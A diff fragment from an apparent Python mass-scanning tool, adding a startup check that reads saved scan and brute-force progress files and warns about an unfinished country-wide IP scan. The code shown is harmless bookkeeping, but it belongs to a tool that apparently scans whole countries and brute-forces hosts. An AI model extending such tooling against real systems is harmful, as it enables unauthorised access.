+            print(f"{Fore.YELLOW}[!] --country-list requires a comma-separated list, e.g. --country-list BD,IN,PK{Style.RESET_ALL}")
+
+    # ── --resume: detect and warn about unfinished scans ──────────────────────
+    if '--resume' in sys.argv or True:  # always check at startup
+        try:
+            _sp_data = load_scan_progress()
+            _bp_data = {}
+            _bp_file = os.path.join(SCRIPT_DIR, 'brute_progress.json')
+            if os.path.exists(_bp_file):
+                with open(_bp_file, 'r') as _bpf:
+                    import json as _json_r
+                    _bp_data = _json_r.load(_bpf)
+            if _sp_data.get('country_code') or _bp_data:
+                _cc_r = _sp_data.get('country_code', 'unknown')
+                _sc_r = _sp_data.get('scanned', 0)
+                _tot_r = _sp_data.get('total', 0)
+                print(f"\n{Fore.YELLOW}[!] Unfinished scan detected: {_cc_r} — {_sc_r:,}/{_tot_r:,} IPs scanned. "
+                      f"Run option 1 or 3 to resume.{Style.RESET_ALL}")
+        except Exception:
+            pass
 
     # ── --list-countries: print all 250 country codes then exit ───────────────
     if '--list-countries' in sys.argv:
